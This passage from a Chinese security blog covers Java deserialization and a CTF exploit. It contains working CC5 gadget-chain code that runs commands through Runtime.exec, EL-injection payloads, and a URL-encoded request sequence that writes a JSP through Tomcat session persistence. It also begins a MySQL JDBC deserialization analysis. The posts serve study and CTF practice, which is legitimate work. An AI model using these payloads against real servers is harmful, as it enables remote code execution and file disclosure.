<p>  在CC1中，调用LazyMap.get方法，是在AnnotationInvocationHandler.invoke中进行调用的，这里用到了动态代理的技术。而在CC5这条链中，借助了两个类，一个是TiedMapEntry，另一个是BadAttributeValueExpException；该链的入口点是BadAttributeValueExpException.readObject方法，在这其中，控制变量值，让其调用到TiedMapEntry.toString方法，进行进入到其getValue方法，调用了map的get方法，完成了整条链的拼接。CC5前半部分的调用链如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">   TiedMapEntry.toString()</span><br><span class="line">      TiedMapEntry.getValue()</span><br><span class="line">         LazyMap.get()</span><br></pre></td></tr></table></figure>

<p>  前面说到该条链的利用需要没有Security Manager，其实在BadAttributeValueExpException.readObject方法中就可以很直观的看到。由于该链前面部分比较简单，因此我们可以直接利用CC1链中构造好的LazyMap对象来构造此链，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                constantTransformer,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(tiedMapEntry);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:/cc5.poc&quot;</span>));</span><br><span class="line">objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:/cc5.poc&quot;</span>));</span><br><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled%203.png" alt="Untitled"></p>
<h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>​    CC1链中用到的AnnotationInvocationHandler入口需要JDK版本7；总的来说，这几条链都会用到几个核心的构造链，比如TemplateImpl，或者transform；在后续分析CC6和CC7的时候，其实调用链很简单，只不过在构造payload的时候，需要注意一些细节的东西，因此在后续分析中这两条链的时候，会详细看看细节部分。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/" data-id="cl8h2gj9f000cfgdp52ll6qeh" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-RWCTF 4th Desperate Cat 赛题学习与复现" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time datetime="2022-02-11T09:18:42.000Z" itemprop="datePublished">2022-02-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/">RWCTF 4th Desperate Cat 赛题学习与复现</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="RWCTF-4th-Desperate-Cat-赛题学习与复现"><a href="#RWCTF-4th-Desperate-Cat-赛题学习与复现" class="headerlink" title="RWCTF 4th Desperate Cat 赛题学习与复现"></a>RWCTF 4th Desperate Cat 赛题学习与复现</h1><p>前言：从一道<code>Java</code>赛题，可以学到很多知识，不论是开发相关，还是漏洞相关，都获益匪浅。本文从零开始，对此赛题做一个复现以及相关知识的学习与总结。</p>
<h2 id="一、基础知识学习"><a href="#一、基础知识学习" class="headerlink" title="一、基础知识学习"></a>一、基础知识学习</h2><p>​    虽然有了解过<code>Java Web</code>开发知识，但对于一些细节知识以及一些运行的机制并不是很了解，导致在面对一个应用的时候，攻击面会变得很窄。</p>
<p>​    本题涉及的知识点有<code>EL</code>表达式、<code>Tomcat</code>中<code>Session</code>文件的存储以及如何让<code>Tomcat</code>正常停止或者重启服务。接下来先单独地学习一下各部分知识点。</p>
<h3 id="1、EL表达式注入"><a href="#1、EL表达式注入" class="headerlink" title="1、EL表达式注入"></a>1、<code>EL</code>表达式注入</h3><p>​    在<code>JSP</code>页面中，一般会使用<code>&lt;%...%&gt;</code>来嵌入代码片段，或者使用<code>&lt;%=表达式 %&gt;</code>。（在看出题师傅的文章的时候，学到一个新的知识，就是<code>&lt;%...%&gt;</code>中的内容如果是<code>Unicode</code>编码形式的字符串，<code>Java</code>代码编译解析器也会对其进行解析）</p>
<p>​    而<code>EL</code>全称为<code>Expression Language</code>，一般用于替换<code>JSP</code>页面中的脚本表达式，它可以用于获取数据、执行运算、获取对象、调用方法。</p>
<p>​    从<code>web.xml 2.4</code> 规范版本开始后，默认都是支持<code>EL</code>的。<code>EL</code>表达式的语法比较简单，也就是<code>$&#123;内容&#125;</code>。</p>
<p>​    比如<strong>获取数据</strong>，可以使用<code>$&#123;name&#125;</code>，这样实质调用的是<code>pageContext.findAttribute(&quot;name&quot;)</code>，并分别从<code>page</code>、<code>request</code>、<code>session</code>、<code>application</code>四个域中去查找相应的对象，如果没有找到，就返回一个空字符串。如果想要获取某个对象里面的属性值，可以使用<code>.</code>这个标识符，例如<code>$&#123;Person.name&#125;</code>表示获取<code>Person</code>这个对象的<code>name</code>属性值，其实质是调用的类<code>get</code>方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    Person person = new Person();</span><br><span class="line">    person.name = &quot;m1sn0w&quot;;</span><br><span class="line">    person.age = 18;</span><br><span class="line">    request.setAttribute(&quot;Person&quot;,person);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;p&gt;$&#123;Person.name&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p>​    <code>EL</code>表达式中也可以执行运算，还可以用于获取<code>Web</code>开发中常用的对象，比如<code>pageContext</code>对象，其对应<code>JSP</code>页面中的<code>pageContext</code>对象；<code>param</code>对象，对应保存用户请求参数<code>map</code>对象。例如<code>$&#123;param.name&#125;</code>，当我们传入<code>name</code>参数的时候，页面就会显示字符串出来。</p>
<p>​    在<code>EL</code>规则里默认会引入<code>java.lang.*</code>下的包，因此，如果存在一个<code>EL</code>表达式注入的漏洞点，我们就可以直接使用<code>Runtime</code>来执行命令，例如<code>$&#123;Runtime.getRuntime().exec(param.cmd)&#125;</code>；还有一些其他的利用方式，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;	# 获取web路径</span><br></pre></td></tr></table></figure>

<h3 id="2、Tomcat持久化Session"><a href="#2、Tomcat持久化Session" class="headerlink" title="2、Tomcat持久化Session"></a>2、<code>Tomcat</code>持久化<code>Session</code></h3><p>​    <code>Session</code>如果保存在内存里面，当服务器重启或者宕机之后，<code>Session</code>就会丢失。因此有时候就需要将<code>Session</code>持久化存放到磁盘上面。这里也很容易想到序列化，毕竟序列化数据的一个作用就是用来持久化操作的。因此，<code>Session</code>中存放的对象就必须是可序列化的，也就是需要是实现<code>java.io.Serializable</code>接口。</p>
<p>​    <code>Tomcat</code>默认是启动了持久化配置的，<code>Session</code>的持久化是由<code>Session Manager</code>来进行管理的。<code>Tomcat</code>提供了两个实现类，一个是<code>org.apache.catalina.session.StandardManager</code>，另外一个是<code>org.apache.catalina.session.PersistentManager</code>，可以通过配置来选择哪种方式进行持久化。</p>
<p>​    <code>StandardManager</code>是默认的<code>Session Manager</code>，当<code>Tomcat</code>服务器关闭或重启，或者<code>Web</code>应用被重新加载时，会对在内存中的<code>HttpSession</code>对象进行持久化， 并把它们保存到文件系统中，默认的文件为<code>&lt;CATALINA_HOME&gt;/work/Catalina/hostname/ applicationname/SESSIONS.ser</code>，如果突然终止服务器，则所有会话都将丧失，因为<code>StandardManager</code>没有机会实现存盘处理。</p>
<h3 id="3、如何让Tomcat-reload部署的程序"><a href="#3、如何让Tomcat-reload部署的程序" class="headerlink" title="3、如何让Tomcat reload部署的程序"></a>3、如何让<code>Tomcat reload</code>部署的程序</h3><p>​    让<code>Tomcat</code>部署的程序进行<code>reload</code>需要满足两个条件，一个是<code>Context reloadable</code>配置为<code>true</code>，但在默认情况下为<code>false</code>，第二个条件就是部署的项目<code>/WEB-INF/classes/</code>下已加载的<code>class</code>文件发生变化或者<code>/WEB-INF/lib/</code>目录下<code>jar</code>文件发生改变。</p>
<h2 id="二、赛题复现"><a href="#二、赛题复现" class="headerlink" title="二、赛题复现"></a>二、赛题复现</h2><p>​    按照题目的设置，简单编写一个示例来进行演示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package com.example.tomcatweb;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.nio.charset.StandardCharsets;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import javax.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span><br><span class="line">public class HelloServlet extends HttpServlet &#123;</span><br><span class="line">    private String message;</span><br><span class="line"></span><br><span class="line">    public void init() &#123;</span><br><span class="line">        message = &quot;Hello World!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123;</span><br><span class="line">        String data = request.getParameter(&quot;content&quot;);</span><br><span class="line">        String PreDirtyData = &quot;asdsad11e12easdxcklc&quot;;</span><br><span class="line">        String LastDirtyData = &quot;Adzxckjapepoe&quot;;</span><br><span class="line">        data = PreDirtyData + data + LastDirtyData;</span><br><span class="line">        String Route = request.getParameter(&quot;route&quot;);</span><br><span class="line">        File file = new File(Route);</span><br><span class="line">        byte[] Contents = data.getBytes(StandardCharsets.UTF_8);</span><br><span class="line">        FileOutputStream fileOutputStream = new FileOutputStream(file);</span><br><span class="line">        fileOutputStream.write(Contents);</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(&quot;文件写入位置&quot; + Route);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    代码的功能就是接受两个参数，一个是<code>content</code>参数用来定义写入文件的内容，一个是<code>route</code>参数用来定义文件的存放位置。</p>
<p>​    按照出题师傅的思路，我们首先需要将<code>Session</code>持久化文件的后缀以及位置进行修改，并且将恶意的代码添加到<code>Session</code>中。这样做的目的是当程序重新加载之后，程序就会将恶意的代码写入指定位置并且解析成<code>jsp</code>文件。</p>
<p>​    接下来就是要动态地开启<code>reload</code>配置选项，因为默认值为<code>false</code>。最后一步就是修改<code>tomcat</code>的<code>appBase</code>路径，这样做是因为写入的<code>jar</code>文件不合法，在<code>reload</code>之后，原本的项目就会出错，虽然此时<code>session.jsp</code>文件已经写入，但是没有办法访问。（当<code>appBase</code>设置为<code>/</code>时，可以通过<code>tomcat</code>来访问<code>Linux</code>下的任何文件，比如<code>/etc/passwd</code>）</p>
<p>​    因此第一次发送的请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=%24%7b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%72%76%6c%65%74%43%6f%6e%74%65%78%74%2e%63%6c%61%73%73%4c%6f%61%64%65%72%2e%72%65%73%6f%75%72%63%65%73%2e%63%6f%6e%74%65%78%74%2e%6d%61%6e%61%67%65%72%2e%70%61%74%68%6e%61%6d%65%3d%70%61%72%61%6d%2e%61%7d%0a%24%7b%73%65%73%73%69%6f%6e%53%63%6f%70%65%5b%70%61%72%61%6d%2e%62%5d%3d%70%61%72%61%6d%2e%63%7d%0a%24%7b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%72%76%6c%65%74%43%6f%6e%74%65%78%74%2e%63%6c%61%73%73%4c%6f%61%64%65%72%2e%72%65%73%6f%75%72%63%65%73%2e%63%6f%6e%74%65%78%74%2e%72%65%6c%6f%61%64%61%62%6c%65%3d%74%72%75%65%7d%0a%24%7b%70%61%67%65%43%6f%6e%74%65%78%74%2e%73%65%72%76%6c%65%74%43%6f%6e%74%65%78%74%2e%63%6c%61%73%73%4c%6f%61%64%65%72%2e%72%65%73%6f%75%72%63%65%73%2e%63%6f%6e%74%65%78%74%2e%70%61%72%65%6e%74%2e%61%70%70%42%61%73%65%3d%70%61%72%61%6d%2e%64%7d&amp;route=/usr/local/tomcat/webapps/tomcat-web-1.0-SNAPSHOT/1.jsp</span><br></pre></td></tr></table></figure>

<p>​    接下来访问<code>1.jsp</code>，写入恶意代码并设置<code>session</code>持久化文件的位置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.jsp?a=/tmp/session.jsp&amp;b=name&amp;c=&lt;%out.println(7904295)%&gt;&amp;d=/</span><br></pre></td></tr></table></figure>

<p>​    之后再随便写入一个<code>jar</code>文件到<code>WEB-INF/lib/</code>目录下面，即可导致整个程序的<code>reload</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=123&amp;route=/usr/local/tomcat/webapps/tomcat-web-1.0-SNAPSHOT/WEB-INF/lib/1.jar</span><br></pre></td></tr></table></figure>

<p>​    最后在根目录访问<code>/tmp/session.jsp</code>即可触发代码：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220211171503900.png" alt="image-20220211171503900"></p>
<h2 id="三、参考链接"><a href="#三、参考链接" class="headerlink" title="三、参考链接"></a>三、参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/267124#h2-7">https://www.anquanke.com/post/id/267124#h2-7</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/" data-id="cl8h2gj930003fgdp9soa2yjq" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-JDBC反序列化漏洞分析&amp;POC编写" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&POC%E7%BC%96%E5%86%99/" class="article-date">
  <time datetime="2022-01-13T13:46:00.000Z" itemprop="datePublished">2022-01-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/01/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&POC%E7%BC%96%E5%86%99/">JDBC反序列化漏洞分析&amp;POC编写</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="JDBC反序列化漏洞分析-amp-POC编写"><a href="#JDBC反序列化漏洞分析-amp-POC编写" class="headerlink" title="JDBC反序列化漏洞分析&amp;POC编写"></a><code>JDBC</code>反序列化漏洞分析&amp;<code>POC</code>编写</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>​    在<code>BlackHat Europe 2019</code>议题中，提及到了<code>MySQL JDBC</code>反序列化漏洞。针对不同的版本，有不同的利用方式。</p>
<h2 id="二、利用链分析"><a href="#二、利用链分析" class="headerlink" title="二、利用链分析"></a>二、利用链分析</h2><p>​    首先分析一下<code>mysql 8.0.14</code>版本环境下的利用方式。从一个漏洞挖掘者的视角，来对整个调用链做一个分析。</p>
<p>​    在<code>Java</code>中，如果想要触发反序列化，我们需要调用<code>readObject</code>方法，因此，在寻找整个利用链的过程中，首先需要定位到最后的触发点，也就是我们需要找到哪个地方调用了<code>readObject</code>方法。在该漏洞的利用过程中，最后用到的是<code>ResultSetImpl</code>的<code>getObject</code>方法，我们跟进该方法查看一下代码：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112222551704.png" alt="image-20220112222551704"></p>
<p>​    可以发现这里调用了<code>readObject</code>方法，也就是说，如果这里的<code>data</code>变量我们可以控制的话，就可以利用反序列化链进行攻击。这里先不看这个的<code>data</code>如何进行控制，而是去寻找如何能够触发这个<code>getObject</code>方法。</p>
<p>​    接下来我们找到了<code>ResultSetUtil.resultSetToMap</code>方法：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112223030048.png" alt="image-20220112223030048"></p>
<p>​    如果这里的<code>rs</code>变量传入的是<code>ResultSetImpl</code>对象的话，就可以调用到最上面的<code>getObject</code>方法。接下来需要继续寻找，哪个地方调用了<code>ResultSetUtil.resultSetToMap</code>，我们找到了<code>ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</code>，其内部调用了上面的<code>ResultSetUtil.resultSetToMap</code>：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112223706987.png" alt="image-20220112223706987"></p>
<p>​    然后我们继续检索，哪个地方调用了<code>ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</code>，最后我们找到了<code>ServerStatusDiffInterceptor.preProcess</code>方法：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112224039235.png" alt="image-20220112224039235"></p>
<p>​    该漏洞前面部分的利用链就到此为止了。在这里需要思考的一个问题是，这里的<code>preProcess</code>方法如何进行调用。这里参考一下官方文档，关于<code>MySQL Connector/J 8.0</code>连接串参数属性<code>https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-statements.html#cj-conn-prop_queryInterceptors</code>。</p>
<p>​    大致解释一下这个<code>queryInterceptors</code>参数，就是指定一个或者多个实现了<code>com.mysql.cj.interceptors.QueryInterceptor</code>接口的类，然后在进行<code>SQL</code>查询操作之前，执行该类中的一个方法从而来影响最终的查询结果，而这个方法就是<code>preProcess</code>方法。（在查询完之后，还会调用其<code>postProcess</code>方法在此进行一个处理）</p>
<p>​    这样，也就能够解释，为什么在构造<code>payload</code>的时候，需要在<code>URL</code>处指定一个<code>queryInterceptors</code>参数。此时还有一个问题，就是上面提到的这个参数，需要在进行<code>SQL</code>查询的时候才能进行触发，而在实际的利用过程中，只需要进行<code>getConnection</code>就能触发。通过简单的调试，可以发现在<code>getConnection</code>过程中，调用了查询语句：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112233233208.png" alt="image-20220112233233208"></p>
<p>​    （我们将断点直接打在<code>ServerStatusDiffInterceptor.preProcess</code>这个方法上面，然后查看整个栈的情况，其实可以发现是通过调用了<code>NativeProtocol</code>类的一些方法后，最终调用了这个<code>preProcess</code>方法，从一个相对比较宏观的角度来看的话，可以按照上面的理解，在进行查询操作之前，就调用了<code>preProcess</code>方法进行了一个处理）</p>
<h2 id="三、mysql数据包"><a href="#三、mysql数据包" class="headerlink" title="三、mysql数据包"></a>三、<code>mysql</code>数据包</h2><p>​    到这里，整个利用的思路就比较清楚了，接下来要做的就是怎么去构造数据，最终能够进行反序列化漏洞的利用。根据上面的分析，我们把关注点放到<code>ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</code>这个上面：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220112223706987.png" alt="image-20220112223706987"></p>
<p>​    关键部分就是<code>rs</code>变量的构造，因为最后我们需要调用<code>rs.getObject</code>方法来进行触发。简单对整个代码进行分析，最后调用了<code>rs.getObject</code>方法，而在这个方法里面，<code>data</code>变量的值为执行查询语句后返回的表的第一列值（根据<code>columnIndex</code>）。我们对上述代码进行调试，当执行完<code>show session status</code>之后，如果可以执行<code>byte[] data = getBytes(columnIndex);</code>的话，那么<code>data</code>变量的值为：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113111639006.png" alt="image-20220113111639006"></p>
<p>​    转换成字符串的形式为<code>Aborted_clients</code>，其对应<code>show session status</code>的第一行第一列数据：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113111829934.png" alt="image-20220113111829934"></p>
<p>​    因此，我们的攻击思路是伪造一个<code>Fake Mysql</code>，然后当这里进行查询的时候，返回一个我们想要构造的数据。这里的难点就是如何返回指定的数据。我们在<code>rs</code>这里下一个断点，然后使用<code>wireshark</code>来捕获一下数据包：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113100319423.png" alt="image-20220113100319423"></p>
<p>​    上面最后的两个数据包，就是客户端发送了请求，然后服务端返回给客户端信息。这里我们参考官方给出的返回结果集的数据包格式，来分析一下：<code>https://dev.mysql.com/doc/internals/en/protocoltext-resultset.html</code></p>
<p>​    这里给出的一个示例为查询<code>SELECT @@version_comment</code>后，数据包返回的数据解析，我们先给出在<code>mysql</code>命令行下，输入该命令的返回结果：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113112502061.png" alt="image-20220113112502061"></p>
<p>​    然后我们获取数据包，查看返回的数据结果：（这里返回了四个序列）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113112739415.png" alt="image-20220113112739415"></p>
<p>​    根据官方文档的解释，我们对每个序列进行一个简单的介绍：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># 第一个序列字段</span><br><span class="line">01 00 00 01 01</span><br><span class="line">前面三个字节表示数据长度，然后接一个01表示sequence id，最后一个01表示返回的列数</span><br><span class="line"></span><br><span class="line"># 第二个序列字段</span><br><span class="line">27 00 00 | 02 | 03 64 65 66 | 00 | 00 | 00 | 11 40 40 76</span><br><span class="line">65 72 73 69 6f 6e 5f 63 6f 6d 6d 65 6e 74 | 00 | 0c |</span><br><span class="line">21 00 | 54 00 00 00 | fd | 00 00 1f 00 00 </span><br><span class="line">这里便于区分，我用|进行分隔开:</span><br><span class="line">- 前面三个字节表示内容的长度</span><br><span class="line">- 02表示sequence id</span><br><span class="line">- 03 64 65 66为catalog</span><br><span class="line">- 00表示schema，不使用一般置为0</span><br><span class="line">- 00表示table</span><br><span class="line">- 00表示org_table</span><br><span class="line">- 下面一段的值为@@version_comment，可以对应我们查询的名称</span><br><span class="line">- 00表示org_name</span><br><span class="line">- 0c表示filter，通常为0c，不用改动</span><br><span class="line">- 21 00 表示character_set</span><br><span class="line">- 54 00 00 00表示column_length</span><br><span class="line">- fd表示column_type，这里是string的意思</span><br><span class="line">- 00 00表示flags</span><br><span class="line">- 1f表示decimals</span><br><span class="line">- 00 00表示filler_2</span><br><span class="line">（大致理解为第二个字段用于定义了返回表的字段的一些信息，比如字段名，字段值类型等）</span><br><span class="line"></span><br><span class="line"># 第三个序列字段</span><br><span class="line">1d 00 00 03 1c 4d 79 53 51 4c 20 43 6f 6d 6d 75 6e 69 74 79 20 53 65 72 76 65 72 20 2d 20 47 50 4c </span><br><span class="line">- 1d 00 00表示内容的长度</span><br><span class="line">- 03表示sequence id</span><br><span class="line">- 后面的部分表示具体的值，也就是对应的MySQL Community Server - GPL</span><br><span class="line">（可以理解为该字段用来定义表中的值）</span><br><span class="line"></span><br><span class="line"># 第四个序列字段</span><br><span class="line">07 00 00 04 fe 00 00 02 00 00 00</span><br><span class="line">- 07 00 00表示内容长度</span><br><span class="line">- 04表示sequence id</span><br><span class="line">- fe表示EOF</span><br><span class="line">- 00表示warning_count</span><br><span class="line">- 02 00表示status_flags，这里的意思为SERVER_STATUS_AUTOCOMMIT</span><br><span class="line">（这个字段主要用于表示结束）</span><br></pre></td></tr></table></figure>

<p>​    通过上面的介绍，我们就可以大致了解每个字段的作用，即分别用于定义列数、列名以及列值。接下来我们就可以大致知道<code>POC</code>怎么进行编写了，一个简单的方式为我们直接把协议的返回字段拿下来，然后修改其中的一部分信息，返回给客户端，即可完成数据的构造（前面的认证过程返回的数据我们直接复制粘贴返回字段值即可）</p>
<h2 id="四、Fake-Mysql编写"><a href="#四、Fake-Mysql编写" class="headerlink" title="四、Fake Mysql编写"></a>四、<code>Fake Mysql</code>编写</h2><p>​    接下来我们来编写一个完成认证过程的<code>Fake Mysql</code>服务端，可以直接粘贴获取<code>Response</code>数据包的值即可：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220113121901554.png" alt="image-20220113121901554"></p>
